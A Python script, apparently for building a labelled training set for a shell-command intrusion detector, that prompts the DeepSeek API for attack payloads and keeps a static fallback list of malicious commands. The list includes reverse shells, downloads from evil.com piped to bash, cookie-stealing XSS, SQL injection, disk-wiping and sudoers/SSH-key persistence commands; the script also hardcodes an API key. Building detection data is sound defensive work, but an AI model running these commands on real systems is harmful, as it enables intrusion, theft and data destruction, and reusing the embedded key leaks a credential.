#!/usr/bin/env python3
"""
Synthetic Attack Dataset Generator for Chameleon LSTM Model (6,000 rows)
=======================================================================

Uses DeepSeek API to generate realistic shell command sequences.
Generates 6,000 rows with balanced classes (3,000 benign, 3,000 malicious).
Loops 12 times, generating 500 rows per batch (250 benign, 250 malicious per batch).

CSV columns: timestamp, attacker_ip, command_sequence, label
- label 0 = Benign
- label 1 = Malicious

Author: Chameleon Security Team
"""

import csv
import random
import time
import json
import urllib.request
import urllib.error
from datetime import datetime, timedelta
from typing import List, Dict

DEEPSEEK_API_KEY = "sk-8846c3bd5c0745c2815679a76acc99d0"
DEEPSEEK_API_URL = "https://api.deepseek.com/chat/completions"
OUTPUT_FILE = "custom_attack_data_6k.csv"
TOTAL_ROWS = 6000
BATCH_SIZE = 500
NUM_BATCHES = 12  # TOTAL_ROWS / BATCH_SIZE

BENIGN_PROMPT = """Generate 10 realistic benign shell commands that a legitimate user or sysadmin would run on an Ubuntu server. 

Include commands like:
- File operations (ls, cat, cp, mv, rm on safe paths)
- System monitoring (top, htop, df, du, free, ps, uptime)
- Network diagnostics (ping, traceroute, netstat, ss, curl to safe URLs)
- Package management (apt update, apt install, apt list)
- Log checking (tail, grep, journalctl)
- User management (whoami, id, groups, passwd)
- Service management (systemctl status, restart, enable)
- Cron jobs (crontab -l)
- Backup operations (tar, rsync)

Return ONLY the commands, one per line, numbered 1-10. No explanations."""

MALICIOUS_PROMPT = """Generate 10 realistic malicious shell commands/attack payloads. Include these attack vectors:

1. SQL Injection in curl parameters:
   - curl with SQLi payloads in GET/POST params
   - Example: curl "http://target/api?id=1' OR '1'='1"
   - curl with UNION SELECT, DROP TABLE payloads

2. XSS in headers and parameters:
   - curl with XSS payloads in headers (-H)
   - curl with script tags in parameters
   - Example: curl -H "X-Forwarded-For: <script>alert(1)</script>"

3. Directory Traversal:
   - Attempts to read sensitive files
   - Example: cat ../../../etc/passwd, ../../etc/shadow
   - curl with path traversal in URLs

4. Reverse Shell Attempts:
   - Bash reverse shells (bash -i, nc, socat)
   - Python reverse shells
   - PHP reverse shells
   - Example: bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'

5. Privilege Escalation:
   - sudo attempts with CVE exploits
   - SUID binary exploitation
   - Kernel exploit references

6. Data Exfiltration:
   - curl/wget to external servers with data
   - DNS exfiltration attempts
   - Base64 encoded data transfer

7. Persistence:
   - Crontab modifications
   - SSH key injection
   - Backdoor installation

Return ONLY the commands/payloads, one per line, numbered 1-10. Make them realistic and varied. No explanations."""


def generate_random_ip() -> str:
    """Generate a random IP address."""
    return f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"


def generate_timestamp(base_time: datetime, offset_seconds: int) -> str:
    """Generate timestamp with offset."""
    ts = base_time + timedelta(seconds=offset_seconds)
    return ts.strftime("%Y-%m-%d %H:%M:%S")


def call_deepseek_api(prompt: str, max_tokens: int = 500) -> List[str]:
    """Call DeepSeek API and parse response."""
    
    headers = {
        "Content-Type": "application/json",
        "Authorization": f"Bearer {DEEPSEEK_API_KEY}"
    }
    
    payload = {
        "model": "deepseek-chat",
        "messages": [
            {"role": "user", "content": prompt}
        ],
        "max_tokens": max_tokens,
        "temperature": 0.8
    }
    
    data = json.dumps(payload).encode('utf-8')
    req = urllib.request.Request(
        DEEPSEEK_API_URL,
        data=data,
        headers=headers,
        method='POST'
    )
    
    try:
        with urllib.request.urlopen(req, timeout=30) as response:
            result = json.loads(response.read().decode('utf-8'))
            content = result['choices'][0]['message']['content']
            return parse_commands(content)
    except urllib.error.URLError as e:
        print(f"API Error: {e}")
        return []
    except Exception as e:
        print(f"Error: {e}")
        return []


def parse_commands(content: str) -> List[str]:
    """Parse numbered commands from API response."""
    commands = []
    lines = content.strip().split('\n')
    
    for line in lines:
        line = line.strip()
        if not line:
            continue
        
        if line[0].isdigit() and '.' in line[:3]:
            cmd = line.split('.', 1)[-1].strip()
        elif line[0].isdigit() and ')' in line[:3]:
            cmd = line.split(')', 1)[-1].strip()
        elif line[0].isdigit() and ' ' in line[:3]:
            cmd = line.split(' ', 1)[-1].strip()
        else:
            cmd = line
        
        if cmd and len(cmd) > 3:
            commands.append(cmd)
    
    return commands


def generate_static_benign() -> List[str]:
    """Generate static benign commands as fallback."""
    return [
        "ls -la /var/log/",
        "df -h",
        "free -m",
        "ps aux | grep nginx",
        "systemctl status mysql",
        "cat /etc/nginx/nginx.conf",
        "tail -100 /var/log/nginx/access.log",
        "netstat -tulpn",
        "crontab -l",
        "whoami",
        "id",
        "uptime",
        "top -n 1 | head -20",
        "du -sh /var/www/*",
        "apt update",
        "apt list --upgradable",
        "journalctl -u nginx -n 50",
        "grep 'error' /var/log/syslog",
        "ping -c 4 google.com",
        "curl -I https://example.com",
        "ssh-keygen -l -f /etc/ssh/ssh_host_rsa_key.pub",
        "openssl x509 -in /etc/ssl/certs/server.crt -text -noout",
        "find /var/www -name '*.php' -mtime -1",
        "tar -czf backup.tar.gz /var/www/html",
        "rsync -avz /var/www/html/ backup/",
        "chmod 644 /var/www/html/index.html",
        "chown www-data:www-data /var/www/html -R",
        "ln -s /var/www/html /home/user/www",
        "mount | grep ext4",
        "lsblk",
        "fdisk -l",
        "cat /proc/meminfo | head -10",
        "cat /proc/cpuinfo | grep 'model name'",
        "hostnamectl",
        "timedatectl",
        "localectl status",
        "nmcli device status",
        "ip addr show",
        "ip route show",
        "ss -tulwn",
        "nslookup google.com",
        "dig example.com",
        "traceroute google.com",
        "mtr -c 10 google.com",
        "wget --spider https://example.com/file.zip",
        "curl -s https://api.ipify.org",
        "scp user@server:/var/log/app.log ./",
        "rsnapshot daily",
        "logrotate -f /etc/logrotate.d/nginx",
    ]


def generate_static_malicious() -> List[str]:
    """Generate static malicious commands as fallback."""
    return [
        "curl \"http://target.com/api?id=1' OR '1'='1\"",
        "curl \"http://target.com/search?q=' UNION SELECT username,password FROM users--\"",
        "curl -X POST \"http://target.com/login\" -d \"user=admin'--&pass=x\"",
        "curl \"http://target.com/api?id=1; DROP TABLE users;--\"",
        "curl -H \"X-Forwarded-For: <script>alert('XSS')</script>\" http://target.com/",
        "curl -H \"User-Agent: <img src=x onerror=alert(1)>\" http://target.com/",
        "curl \"http://target.com/search?q=<script>document.location='http://evil.com/steal?c='+document.cookie</script>\"",
        "cat ../../../etc/passwd",
        "cat ../../../../etc/shadow",
        "curl \"http://target.com/file?path=../../../etc/passwd\"",
        "curl \"http://target.com/download?file=....//....//etc/shadow\"",
        "bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'",
        "bash -i >& /dev/tcp/192.168.1.100/8080 0>&1",
        "nc -e /bin/sh 10.0.0.1 4444",
        "ncat 10.0.0.1 4444 -e /bin/bash",
        "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        "php -r '$sock=fsockopen(\"10.0.0.1\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "rm -rf /var/www/html/*",
        "rm -rf /* --no-preserve-root",
        "dd if=/dev/zero of=/dev/sda bs=1M",
        "mkfs.ext4 /dev/sda1",
        "wget http://evil.com/malware.sh -O /tmp/malware.sh && bash /tmp/malware.sh",
        "curl http://evil.com/backdoor.php | bash",
        "echo '* * * * * bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' | crontab -",
        "echo 'ssh-rsa AAAAB3Nza... attacker@evil.com' >> /root/.ssh/authorized_keys",
        "curl -X POST http://target.com/api/admin -H \"Content-Type: application/json\" -d '{\"role\":\"admin\",\"id\":1}'",
        "curl \"http://target.com/api/users?sort=password&order=ASC\"",
        "curl -H \"X-Original-URL: /admin\" http://target.com/",
        "curl \"http://target.com/image?file=php://filter/convert.base64-encode/resource=/etc/passwd\"",
        "curl -X PUT http://target.com/api/user/1 -d '{\"password\":\"hacked123\"}'",
        "env x='() { :;}; /bin/bash -c \"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\"' bash -c 'echo vulnerable'",
        "sudo nmap --script vuln target.com",
        "sqlmap -u \"http://target.com/api?id=1\" --batch --dbs",
        "nikto -h http://target.com",
        "gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt",
        "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target.com",
        "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt",
        "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST 10.0.0.1; run\"",
        "curl -H \"Host: internal.target.com\" http://target.com/",
        "curl \"http://target.com/proxy?url=http://169.254.169.254/latest/meta-data/\"",
        "dig @target.com axfr target.com",
        "host -t txt target.com",
        "enum4linux target.com",
        "smbclient -L //target.com -U admin%password",
        "rpcclient -U admin%password target.com -c 'enumdomusers'",
        "echo 'ALL ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers",
        "chmod 4777 /bin/bash",
        "find / -perm -4000 -type f 2>/dev/null",
        "curl \"http://target.com/cgi-bin/test.cgi?cmd=cat%20/etc/passwd\"",
    ]


def generate_benign_commands() -> List[str]:
    """Generate benign command sequences via API."""
    return call_deepseek_api(BENIGN_PROMPT, max_tokens=600)


def generate_malicious_commands() -> List[str]:
    """Generate malicious command sequences via API."""
    return call_deepseek_api(MALICIOUS_PROMPT, max_tokens=800)


def collect_commands_via_api(desired_count: int, benign: bool) -> List[str]:
    """Collect commands via API calls, fallback to static if needed."""
    collected = []
    static_pool = generate_static_benign() if benign else generate_static_malicious()
    
    # Make API calls until we have enough commands
    while len(collected) < desired_count:
        if benign:
            commands = generate_benign_commands()
        else:
            commands = generate_malicious_commands()
        
        if commands:
            collected.extend(commands)
            print(f"    → Got {len(commands)} commands (total: {len(collected)})")
        else:
            # Use static fallback
            needed = desired_count - len(collected)
            sample = random.sample(static_pool, min(needed, len(static_pool)))
            collected.extend(sample)
            print(f"    → Using static fallback, added {len(sample)} commands")
        
        time.sleep(0.5)  # Rate limiting
    
    return collected[:desired_count]


def main():
    print("=" * 70)
    print(" CHAMELEON SYNTHETIC DATASET GENERATOR (6,000 rows)")
    print(" Batching: 12 batches of 500 rows each")
    print("=" * 70)
    
    base_time = datetime.now() - timedelta(days=30)
    
    # Open CSV file for writing (append mode)
    file_exists = False
    try:
        with open(OUTPUT_FILE, 'r') as f:
            file_exists = True
            print(f"[INFO] Output file {OUTPUT_FILE} already exists, appending batches.")
    except FileNotFoundError:
        pass
    
    with open(OUTPUT_FILE, 'a', newline='', encoding='utf-8') as f:
        writer = csv.DictWriter(f, fieldnames=['timestamp', 'attacker_ip', 'command_sequence', 'label'])
        if not file_exists:
            writer.writeheader()
        
        for batch_idx in range(NUM_BATCHES):
            print(f"\n[Batch {batch_idx+1}/{NUM_BATCHES}] Generating {BATCH_SIZE} rows...")
            print("-" * 50)
            
            # Each batch: 250 benign, 250 malicious
            batch_data = []
            
            # Generate benign commands for this batch
            print(f"  Generating 250 benign commands...")
            benign_commands = collect_commands_via_api(250, benign=True)
            
            # Generate malicious commands for this batch
            print(f"  Generating 250 malicious commands...")
            malicious_commands = collect_commands_via_api(250, benign=False)
            
            # Create rows with timestamps and IPs
            offset = batch_idx * BATCH_SIZE * 60  # 1 minute per row
            
            for i in range(250):
                batch_data.append({
                    'timestamp': generate_timestamp(base_time, offset + i * 60),
                    'attacker_ip': generate_random_ip(),
                    'command_sequence': benign_commands[i],
                    'label': 0
                })
            
            for i in range(250):
                batch_data.append({
                    'timestamp': generate_timestamp(base_time, offset + (250 + i) * 60),
                    'attacker_ip': generate_random_ip(),
                    'command_sequence': malicious_commands[i],
                    'label': 1
                })
            
            # Shuffle batch
            random.shuffle(batch_data)
            
            # Write batch to CSV
            writer.writerows(batch_data)
            print(f"  ✅ Batch {batch_idx+1} written ({len(batch_data)} rows)")
    
    # Final summary
    print("\n" + "=" * 70)
    print(" DATASET GENERATION COMPLETE")
    print("=" * 70)
    
    # Count rows in output file
    with open(OUTPUT_FILE, 'r', encoding='utf-8') as f:
        reader = csv.DictReader(f)
        rows = list(reader)
    
    benign_count = sum(1 for r in rows if int(r['label']) == 0)
    malicious_count = sum(1 for r in rows if int(r['label']) == 1)
    
    print(f"  Total rows: {len(rows)}")
    print(f"  Benign (0): {benign_count}")
    print(f"  Malicious (1): {malicious_count}")
    print(f"  Output file: {OUTPUT_FILE}")
    
    # Show samples
    print("\n[Sample Data]")
    print("-" * 70)
    benign_samples = [r for r in rows if int(r['label']) == 0][:2]
    malicious_samples = [r for r in rows if int(r['label']) == 1][:2]
    
    print("Benign examples:")
    for i, row in enumerate(benign_samples):
        print(f"  {i+1}. {row['command_sequence'][:70]}...")
    
    print("\nMalicious examples:")
    for i, row in enumerate(malicious_samples):
        print(f"  {i+1}. {row['command_sequence'][:70]}...")
    
    print("\n" + "=" * 70)
    print(" ✅ DATASET GENERATION COMPLETE!")
    print("=" * 70)


if __name__ == "__main__":
    main()